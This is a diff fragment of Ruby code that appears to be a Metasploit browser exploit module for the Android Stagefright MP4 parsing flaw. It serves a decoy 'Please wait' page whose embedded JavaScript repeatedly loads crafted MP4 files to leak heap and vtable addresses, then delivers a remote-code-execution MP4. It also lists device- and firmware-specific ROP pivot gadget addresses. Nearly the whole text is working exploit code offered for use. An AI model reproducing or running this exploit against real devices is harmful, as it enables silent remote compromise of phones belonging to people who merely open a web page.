+      out_hdrs = {'Content-Type'=>'video/mp4'}
+
+      if peer[:vector_vtable_addr].nil?
+        # Generate the nasty MP4 to leak infoz
+        mode = "infoleak"
+        mp4 = get_mp4_leak(my_target, peer)
+      else
+        mode = "RCE"
+        mp4 = get_mp4_rce(my_target, peer)
+        if mp4.nil?
+          send_not_found(cli)
+          print_error("#{cli.peerhost}:#{cli.peerport} - Requested #{request.uri} - Failed to generate RCE MP4")
+          return
+        end
+      end
+
+      # Send the nasty MP4 file to trigger the vulnerability
+      if request.headers['Accept-Encoding'] and request.headers['Accept-Encoding'].include? 'gzip'
+        mp4 = Rex::Text.gzip(mp4)
+        out_hdrs.merge!('Content-Encoding' => 'gzip')
+        gzip = "gzip'd"
+      else
+        gzip = "raw"
+      end
+
+      client = "Browser"
+      if request.headers['User-Agent'].include? 'stagefright'
+        client = "SF"
+      end
+
+      addrs = "heap: 0x%x, code: 0x%x" % [ peer[:near_sampiter_addr].to_i, peer[:vector_vtable_addr].to_i ]
+
+      print_status("Sending #{mode} #{gzip} MPEG4 (#{mp4.length} bytes) to #{cli.peerhost}:#{cli.peerport}... (#{addrs} from #{client})")
+
+      # Send the nastiness!
+      send_response(cli, mp4, out_hdrs)
+      return
+    end
+
+    # Initialize a target. If none suitable, then we don't continue.
+    my_target = target
+    if my_target.name =~ /Automatic/
+      my_target = get_target(request)
+      if my_target.nil?
+        send_not_found(cli)
+        print_error("#{cli.peerhost}:#{cli.peerport} - Requested #{request.uri} - Unknown user-agent: #{request['User-Agent'].inspect}")
+        return
+      end
+      vprint_status("Target selected: #{my_target.name}")
+    end
+
+    # Generate an MP4 filename for this peer
+    mp4_fn = rand_text_alpha(11)
+
+    # Save the target for when they come back asking for this file
+    # Also initialize the leak address to the first one
+    @peers[mp4_fn] = { :target => my_target }
+
+    # Send the index page
+    mp4_uri = "#{get_resource.chomp('/')}/#{mp4_fn}.mp4"
+    html = %Q^<html>
+<head>
+<title>Please wait...</title>
+<script>
+var video;       // the video tag
+var to_id;       // timeout ID
+var req_start;   // when we requested the video
+var load_start;  // when we loaded the video
+// Give mediaserver some time to settle down after restarting -- increases reliability
+var waitTime = 100; // 6000;
+var error = false;
+var near_sampiter_addr = -1;
+var vector_vtable_addr = -1;
+var crashes = 0;
+
+function duration_changed() {
+  var now = Date.now();
+  var req_time = now - req_start;
+  var load_time = now - load_start;
+  console.log('duration changed to: ' + video.duration + ' (load: ' + load_time + ', req: ' + req_time + '), 0x' + video.videoWidth.toString(16) + ' x 0x' + video.videoHeight.toString(16));
+  if (load_time > 2000) {
+    // probably crashed. reset the entire process..
+    near_sampiter_addr = -1;
+    vector_vtable_addr = -1;
+    waitTime = 6000;
+    crashes += 1;
+    if (crashes > 5) {
+      console.log('too many crashes!!!');
+      stop_everything();
+    }
+  }
+  else {
+    // if we got the near_sampiter_addr already, we are now trying to read the code pointer.
+    // otherwise, we're trying to find near_sampiter_addr...
+    if (near_sampiter_addr == -1) {
+      // if we get this value, we failed to overwrite the metadata. try again.
+      if (video.videoHeight != 768) { // XXX: TODO: parameterize
+        if (video.videoHeight != 0) { // wtf? crashed??
+          value = video.videoHeight;
+          console.log('leaked heap pointer: 0x' + value.toString(16));
+          near_sampiter_addr = value;
+        }
+      }
+    } else if (vector_vtable_addr == -1) {
+      // if we get this value, we failed to overwrite the metadata. try again.
+      if (video.duration != 314) { // XXX: TODO: parameterize
+        // zero means a value that could not be represented...
+        if (video.duration != 0) {
+          var value = Math.round(video.duration * 1000000);
+          console.log('leaked memory: ' + video.duration + ' (near_sampiter_addr: 0x' + near_sampiter_addr.toString(16) + '): 0x' + value.toString(16));
+
+          vector_vtable_addr = value;
+        }
+      }
+    }
+
+    // otherwise, we just keep trying with the data we have...
+  }
+
+  if (error == false) {
+    if (vector_vtable_addr == -1) {
+      to_id = setTimeout(reload_leak, waitTime);
+    } else {
+      to_id = setTimeout(reload_rce, waitTime);
+    }
+    waitTime = 100;
+  }
+}
+
+function stop_everything() {
+  if (error == false) {
+    console.log('---- GIVING UP!! ----');
+    error = true;
+  }
+  if (to_id != -1) {
+    clearTimeout(to_id);
+  }
+}
+
+function start() {
+  video = document.getElementById('vid');
+  video.onerror = function() {
+    console.log('  onError called!');
+    stop_everything();
+  }
+  video.ondurationchange = duration_changed;
+  //reload_rce();
+  reload_leak();
+}
+
+function get_uri() {
+  var rn = Math.floor(Math.random() * (0xffffffff - 1)) + 1;
+  var uri = '#{mp4_uri}?x=' + rn;
+  if (near_sampiter_addr != -1) {
+    uri += '&sia=' + near_sampiter_addr;
+  }
+  if (vector_vtable_addr != -1) {
+    uri += '&sfv=' + vector_vtable_addr;
+  }
+  return uri;
+}
+
+function reload_leak() {
+  to_id = -1;
+  var xhr = new XMLHttpRequest;
+  xhr.responseType = 'blob';
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+      if (xhr.status != 200 || !xhr.response) {
+        stop_everything();
+        return;
+      }
+      load_start = Date.now();
+      try {
+        //var url = URL.createObjectURL(xhr.response);
+        var a = new FileReader();
+        a.onload = function(e) {
+          //console.log('onload: ' + e.target.result);
+          video.src = e.target.result
+        };
+        a.onerror = function(e) { console.log('blob 2 data error: ' + e.error); }
+        a.readAsDataURL(xhr.response);
+      } catch(e) {
+        console.log('  ERROR: ' + e.message);
+        stop_everything();
+      }
+    }
+  };
+  xhr.open('GET', get_uri(), true);
+  req_start = Date.now();
+  xhr.send();
+}
+
+function reload_rce() {
+  to_id = -1;
+  video.src = get_uri();
+}
+</script></head>
+<body onload='start()'>
+<video id=vid width=1px controls>
+Your browser does not support VIDEO tags.
+</video><br />
+Please wait while we locate your content...
+</body>
+</html>
+^
+    print_status("Sending HTML to #{cli.peerhost}:#{cli.peerport}...")
+    send_response(cli, html, {'Content-Type'=>'text/html'})
+  end
+
+  #
+  # Return some firmware-specific values to the caller.
+  #
+  # The VectorRVA field is extracted using the following command:
+  #
+  # $ arm-eabi-readelf -a libstagefright.so  | grep _ZTVN7android6VectorIjEE
+  #
+  def get_details(my_target)
+    details = {
+      'lrx' => {
+        'VectorRVA' => 0x10ae30,
+        'PivotStrategy' => 'lrx',
+        'Pivot1' => 0x67f7b,   # ldr r4, [r0] ; ldr r1, [r4, #0x10] ; blx r1
+        'Pivot2' => 0xaf9dd,   # ldm.w r4, {sp} ; pop {r3, pc}
+        'Adjust' => 0x475cd    # pop {r3, r4, pc}
+      },
+      'lmy-1' => {
+        'VectorRVA' => 0x10bd58,
+        'PivotStrategy' => 'lmy-1',
+        'Pivot1' => 0x68783,   # ldr r4, [r0] ; ldr r1, [r4, #0x10] ; blx r1
+        'Pivot2' => 0x81959,   # ldm.w r4, {r1, ip, sp, pc}
+        'Adjust' => 0x479b1    # pop {r3, r4, pc}
+      },
+      'lmy-2' => {
+        'VectorRVA' => 0x10bd58,
+        'PivotStrategy' => 'lmy-2',
+        'Pivot1' => 0x6f093,   # ldr r0, [r0, #0x10] ; ldr r3, [r0] ; ldr r1, [r3, #0x18] ; blx r1
+        'Pivot2' => 0x81921,   # ldm.w r0!, {r1, ip, sp, pc}
+        'Adjust' => 0x479b1    # pop {r3, r4, pc}
+      },
+      'shamu / LYZ28E' => {
+        'VectorRVA' => 0x116d58,
+        'PivotStrategy' => 'lyz',
+        'Pivot1' => 0x91e91,   # ldr r0, [r0] ; ldr r6, [r0] ; ldr r3, [r6] ; blx r3
+        'Pivot2' => 0x72951,   # ldm.w r0, {r0, r2, r3, r4, r6, r7, r8, sl, fp, sp, lr, pc}
+        'Adjust' => 0x44f81    # pop {r3, r4, pc}
+      },
+      'shamu / LYZ28J' => {
+        'VectorRVA' => 0x116d58,
+        'PivotStrategy' => 'lyz',
+        'Pivot1' => 0x91e49,   # ldr r0, [r0] ; ldr r6, [r0] ; ldr r3, [r6] ; blx r3
+        'Pivot2' => 0x72951,   # ldm.w r0, {r0, r2, r3, r4, r6, r7, r8, sl, fp, sp, lr, pc}
+        'Adjust' => 0x44f81    # pop {r3, r4, pc}
+      },
+      'sm-g900v / OE1' => {
+        'VectorRVA' => 0x174048,
+        'PivotStrategy' => 'sm-g900v',
+        'Pivot1' => 0x89f83,   # ldr r4, [r0] ; ldr r5, [r4, #0x20] ; blx r5
+        'Pivot2' => 0xb813f,   # ldm.w r4!, {r5, r7, r8, fp, sp, lr} ; cbz r0, #0xb8158 ; ldr r1, [r0] ; ldr r2, [r1, #4] ; blx r2
+        'Adjust' => 0x65421    # pop {r4, r5, pc}
+      }
+    }
+
+    details[my_target['Rop']]
+  end
+
+end
